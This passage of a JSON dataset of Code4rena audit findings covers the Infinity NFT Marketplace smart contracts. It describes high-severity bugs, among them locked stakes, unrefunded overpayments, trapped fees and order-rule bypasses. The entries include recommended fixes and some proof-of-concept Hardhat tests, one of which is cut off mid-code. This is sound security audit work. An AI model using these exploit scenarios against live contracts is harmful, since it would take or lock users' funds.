      "content": "_Submitted by Ruhum, also found by 0xDjango, auditor0517, dipp, GimelSec, GreyArt, p4st13r4, and wagmi_\n\nFollowing scenario:\n\nAlice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.\n\n### Proof of Concept\n\nFirst, here's a test showcasing the issue:\n\n```js\n  describe('should cause trouble', () => {\n    it('should lock up funds', async function () {\n      await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked, 2);\n      await network.provider.send(\"evm_increaseTime\", [181 * DAY]);\n      await network.provider.send('evm_mine', []);\n      \n      // The funds we staked for 6 months have vested\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // Now we want to stake funds for three months\n      await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked2, 1);\n\n      // total staked is now the funds staked for three & six months\n      // total vested stays the same\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // we unstake the funds that are already vested.\n      const userBalanceBefore = await token.balanceOf(signer1.address);\n      await infinityStaker.connect(signer1).unstake(amountStaked);\n      const userBalanceAfter = await token.balanceOf(signer1.address);\n\n      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));\n\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));\n    });\n  });\n```\n\nThe test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.\n\nThe issue is in the `_updateUserStakedAmounts()` function:\n\n```sol\n    if (amount > noVesting) {\n      userstakedAmounts[user][Duration.NONE].amount = 0;\n      userstakedAmounts[user][Duration.NONE].timestamp = 0;\n      amount = amount - noVesting;\n      if (amount > vestedThreeMonths) {\n        // MAIN ISSUE:\n        // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.\n        // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n        amount = amount - vestedThreeMonths;\n        // `amount == vestedSixMonths` so we enter the else block\n        if (amount > vestedSixMonths) {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n          amount = amount - vestedSixMonths;\n          if (amount > vestedTwelveMonths) {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n          } else {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;\n          }\n        } else {\n          // the staked amount is set to `0`.\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;\n        }\n      } else {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;\n      }\n    } else {\n      userstakedAmounts[user][Duration.NONE].amount -= amount;\n    }\n```\n\n### Recommended Mitigation Steps\n\nDon't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1163063584)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1179743567):**\n > When unstaking, unvested tokens may become locked in the contract forever.\n> \n> Accepting this as a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a smart contract code that can cause funds to be locked up. The vulnerability is present in the 'InfinityStaker.sol' contract and is located between lines 290 and 325. The issue is demonstrated in a test case, which showcases the scenario where Alice has staked X tokens for 6 months that have vested, and then stakes Y tokens for another 3 months. If she then calls 'unstake(X)' to take out the tokens that have vested, the Y tokens she staked for 3 months will be locked up. The issue is in the '_updateUserStakedAmounts()' function, where the current staked tokens are set to 0 and the amount is decreased by 0. This should not happen if the vested amount is 0. The recommended mitigation step is to not set 'userstakedAmounts.amount' to 0 if none of its tokens are removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/50",
      "tags": [],
      "finders": [
        "GreyArt",
        "auditor0517",
        "0xDjango",
        "Ruhum",
        "dipp",
        "p4st13r4",
        "wagmi",
        "GimelSec"
      ]
    },
    {
      "id": "2774",
      "title": "[H-08] Overpayment of native ETH is not refunded to buyer",
      "impact": "HIGH",
      "content": "_Submitted by horsefacts, also found by 0x29A, antonttc, berndartmueller, byterocket, cccz, codexploder, dipp, GimelSec, GreyArt, Lambda, oyc_109, Ruhum, and unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232>\n\n### Vulnerability Details\n\n`InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.\n\nIn the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.\n\nIn a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.\n\nThe `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:\n\n[`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\n[`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\nHowever, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.\n\nMoreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.\n\nScenario:\n\n*   Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`.\n*   Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment.\n*   Bob's transaction is included at time `3`. The calculated price is `1250`.\n*   Bob's additional `750` wei are locked in the contract and not refunded.\n\nSuggestion: Calculate and refund overpayment amounts to callers.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1160526998):**\n > Agree with the assessment, fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/a605b72e44256aee76d80ae1652e5c98c855ffd3\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1179719920):**\n > In the case of a Dutch auction, precise pricing is unknown at the time a tx is broadcasted. This leads to users overpaying and the surplus is taken as exchange fees instead of being refunded.\n> \n> Accepting as a High risk submission.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the InfinityExchange smart contract, which accepts payments in native ETH but does not return overpayments to the buyer. Overpayments are likely to occur in the case of auction orders priced in native ETH, such as Dutch and reverse Dutch auctions. The functions `takeOrders` and `takeMultipleOneOrders` check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution, however, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance, and due to a bug in `rescueETH`, these overpayments will be locked permanently. \n\nTo illustrate this, an example is given of Alice creating a sell order for her token with reverse Dutch auction constraints, and Bob filling the order at time `2` with a payment of `2000` wei. Bob's transaction is included at time `3` when the calculated price is `1250`, leaving an overpayment of `750` wei which is locked in the contract and not refunded. \n\nThe suggestion is to calculate and refund overpayment amounts to callers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/244",
      "tags": [],
      "finders": [
        "GreyArt",
        "codexploder",
        "cccz",
        "unforgiven_",
        "Ruhum",
        "berndartmueller",
        "Lambda",
        "antonttc",
        "byterocket",
        "dipp",
        "0x29A",
        "oyc109",
        "horsefacts",
        "GimelSec"
      ]
    },
    {
      "id": "2773",
      "title": "[H-07] `_transferNFTs()` succeeds even if no transfer is performed",
      "impact": "HIGH",
      "content": "_Submitted by k, also found by 0x29A, 0xf15ers, 0xsanson, antonttc, hyh, PwnedNoMore, and zzzitron_\n\nIf an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:\n\n1.  A token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly.\n2.  An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.\n3.  A malicious contract that is deployed to take advantage of this behavior.\n\n### Proof of Concept\n\n<https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9>\n\n### Recommended Mitigation Steps\n\nIf neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1162963184):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1179596601):**\n> If `supportsInterface` returns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.\n> \n> A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange.sol contract code on GitHub. If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. This means that the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This vulnerability can occur in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly; 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces; and 3. a malicious contract that is deployed to take advantage of this behavior. A proof of concept is provided to demonstrate the vulnerability. The recommended mitigation steps are to either revert if neither the ERC-721 nor the ERC-1155 interface is supported, or to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87",
      "tags": [
        "ERC721",
        "ERC1155"
      ],
      "finders": [
        "0xsanson",
        "0xf15ers",
        "k",
        "antonttc",
        "zzzitron",
        "0x29A",
        "hyh",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2772",
      "title": "[H-06] Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`",
      "impact": "HIGH",
      "content": "_Submitted by PwnedNoMore_\n\nMany real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.\n\nFor example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d\\&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).\n\nAssuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n```\n\nThe code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,\n\n```solidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\nSince the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.\n\nThat means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.\n\nNote that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.\n\n### Proof of Concept\n\nCheck the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.\n\n### Recommended Mitigation Steps\n\nReorder the checks,e.g.,\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    }\n  }\n```\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1162965894):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.\n\n**[HardlyDifficult commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1179595297):**\n > When an NFT supports both 721 & 1155 interfaces, the code prefers `_transferERC721s` - however this ignores the order's `numTokens`. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden's recommendation would address this concern. Or maybe `_transferERC721s` could require `numTokens == 1`, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange smart contract, which could lead to users paying for more tokens than they receive. The bug affects tokens that support both ERC721 and ERC1155 standards, such as the asset token of The Sandbox Game. The vulnerability is caused by the code in the InfinityExchange contract, which first checks ERC721 interface supports and then ERC1155, leading to only one item being transferred instead of the expected two. The bug can be fixed by reordering the checks, so the ERC1155 check is first. This would ensure that the expected number of tokens is transferred.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43",
      "tags": [
        "ERC721",
        "ERC1155",
        "supportsInterface"
      ],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "2771",
      "title": "[H-05] Missing Complication check in `takeMultipleOneOrders`",
      "impact": "HIGH",
      "content": "_Submitted by shenwilly_\n\nAn order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.\n\n`takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.\n\n### Proof of Concept\n\n*   Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order.\n*   A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.\n\n### Recommended Mitigation Steps\n\nAdd `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check:\n\n    function takeMultipleOneOrders() {\n        ...\n        for (uint256 i = 0; i < numMakerOrders; ) {\n            bytes32 makerOrderHash = _hash(makerOrders[i]);\n            bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);\n            bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);\n            \n            require(makerOrderValid && executionValid, 'order not verified');\n            \n            require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n            require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n            uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n            totalPrice += execPrice; // @audit-issue missing complication check\n            _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n            unchecked {\n                ++i;\n            }\n        }\n        ...\n    }\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1162936193):**\n > fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/0b7608a2c9efc71d902a9c90f4731ef434b42c31.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1179806203):**\n > `takeMultipleOneOrders` does not check restrictions set via the Complication. Agree with the High risk assessment here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of a smart contract, namely InfinityExchange.sol, which is part of the code-423n4/2022-06-infinity repository. The vulnerability is related to the way orders are handled by the contract. Specifically, the contract does not check the Complication of an order, which is used to define its type and rules. This means that anyone can take any orders, regardless of the Complication, leading to unexpected execution of orders. \n\nThe Proof of Concept provided in the report shows that Alice signs a makerOrder with a PrivateSaleComplication, which should only allow Bob to take the private sale order. However, a malicious trader can call the takeMultipleOneOrders function to take Alice's order, despite the Complication only allowing Bob to take it.\n\nThe Recommended Mitigation Steps suggest that a canExecTakeOneOrder function should be added in IComplication.sol and implemented into InfinityOrderBookComplication and any future Complications. Additionally, the takeMultipleOneOrders function should be modified to use the check. \n\nIn summary, this bug report is about a vulnerability in the code of a smart contract, which allows anyone to take any orders regardless of their Complication rules, leading to unexpected execution of orders. The Recommended Mitigation Steps suggest the addition of a canExecTakeOneOrder function and modification of the takeMultipleOneOrders function to use this check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/125",
      "tags": [],
      "finders": [
        "shenwilly"
      ]
    },
    {
      "id": "2770",
      "title": "[H-04] Accumulated ETH fees of InfinityExchange cannot be retrieved",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by 0x29A, 0xf15ers, 0xkowloon, 0xNineDec, berndartmueller, byterocket, cccz, codexploder, GreyArt, horsefacts, IllIllI, Kenshin, kenzo, KIntern, Lambda, obront, obtarian, oyc_109, peritoflores, rajatbeladiya, rfa, saian, unforgiven, WatchPug, Wayne, and zer0dot_\n\nETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.\n\nSetting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.\n\n### Proof of Concept\n\nFees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:\n\n    takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees\n    takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees\n\nWhile token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141>\n\n```solidity\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n```\n\ni.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.\n\nThe only way to retrieve ETH from the contract is rescueETH() function:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232>\n\n```solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n```\n\nHowever, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.\n\n### Recommended Mitigation Steps\n\nConsider adding contract balance to the funds transferred:\n\n```solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n-   (bool sent, ) = destination.call{value: msg.value}('');\n+   (bool sent, ) = destination.call{value: address(this).balance}('');\n    require(sent, 'failed');\n  }\n```\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/296)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/296#issuecomment-1179570179):**\n > When an order is filled using ETH, the exchange collects fees by holding them in the contract for later withdraw. However the only withdraw mechanism does not work so that ETH becomes trapped forever.\n> \n> This is a High risk issue since some ETH is lost with each ETH based trade.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations in the InfinityExchange contract. This vulnerability results in the permanent freezing of ETH revenue of the project, and the severity is set as high.\n\nThe ETH fees are kept with the InfinityExchange contract when the currency is ETH, and the only way to retrieve ETH from the contract is the rescueETH() function. However, the rescueETH() function cannot reach the ETH on the contract balance, as only ETH attached to the rescueETH() call is transferred. \n\nThe recommended mitigation steps include adding contract balance to the funds transferred. This will allow the rescueETH() function to access the ETH balance of the contract and prevent the permanent freezing of ETH revenue of the project.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/296",
      "tags": [],
      "finders": [
        "codexploder",
        "0xf15ers",
        "berndartmueller",
        "KIntern",
        "saian",
        "0x29A",
        "zer0dot_",
        "Wayne",
        "obtarian",
        "Lambda",
        "peritoflores",
        "oyc109",
        "Kenshin",
        "kenzo",
        "IllIllI",
        "GreyArt",
        "cccz",
        "WatchPug",
        "horsefacts",
        "0xNineDec",
        "rfa",
        "0xkowloon",
        "byterocket",
        "hyh",
        "unforgiven",
        "rajatbeladiya",
        "obront"
      ]
    },
    {
      "id": "2769",
      "title": "[H-03] `canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present",
      "impact": "HIGH",
      "content": "_Submitted by PwnedNoMore, also found by 0xsanson, hyh, k, throttle, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243>\n\n### Impact\n\nWhen any user provides a `sellOrder` and they are trying to sell multiple tokens from *n* (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.\n\nIn short, hackers can violate the user-defined orders.\n\n### Root Cause\n\nThe logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.\n\n**Let's take ` canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)  ` as an example, while `canExecMatchOneToMany` shares the same error.**\n\nSpecifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.\n\nThe problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.\n\nFor example, if the order requires\n\n```\n[\n    {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    },\n    {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    }\n];\n\n```\n\nand the taker provides\n\n    [\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n    ];\n\nThe taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.\n\nAs for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.\n\n### Proof of Concept\n\nFirst put the `MockERC1155.sol` under the `contracts/` directory:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';\nimport {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract MockERC1155 is ERC1155URIStorage, Ownable {\n  uint256 numMints;\n\n  constructor(string memory uri) ERC1155(uri) {}\n\n  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {\n    super._mint(to, id, amount, data);\n  }\n}\n```\n\nAnd then put `poc.js` under the `test/` directory.\n\n```js\nconst { expect } = require('chai');\nconst { ethers, network } = require('hardhat');\nconst { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');\nconst {\n  getCurrentSignedOrderPrice,\n  approveERC20,\n  grantApprovals,\n  signOBOrder\n} = require('../helpers/orders');\n\nasync function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {\n  // grant approvals\n  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);\n  if (!approvals) {\n    return undefined;\n  }\n\n  // sign order\n  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);\n\n  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);\n  if (!isSigValid) {\n    console.error('Signature is invalid');\n    return undefined;\n  }\n  return signedOBOrder;\n}\n\ndescribe('PoC', function () {\n  let signers,\n    dev,\n    matchExecutor,\n    victim,\n    hacker,\n    token,\n    infinityExchange,\n    mock1155Contract1,\n    mock1155Contract2,\n    obComplication\n\n  const sellOrders = [];\n\n  let orderNonce = 0;\n\n  const UNIT = toBN(1e18);\n  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);\n\n  const totalNFTSupply = 100;\n  const numNFTsToTransfer = 50;\n  const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;\n\n  function toBN(val) {\n    return ethers.BigNumber.from(val.toString());\n  }\n\n  before(async () => {\n    